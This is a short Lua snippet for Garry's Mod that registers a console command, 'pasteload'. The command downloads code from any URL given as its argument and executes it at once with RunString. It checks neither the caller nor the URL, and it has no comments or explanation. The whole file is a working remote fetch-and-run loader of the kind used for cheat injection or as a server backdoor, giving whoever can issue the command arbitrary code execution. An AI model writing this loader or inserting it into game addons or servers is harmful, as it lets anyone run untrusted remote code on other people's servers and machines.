concommand.Add("pasteload", function(ply, cmd, args)
    if args[1] then
        http.Fetch(args[1], function(body)
            if not body then return end
            RunString( body, "pussy", false)

        end)
    end
end)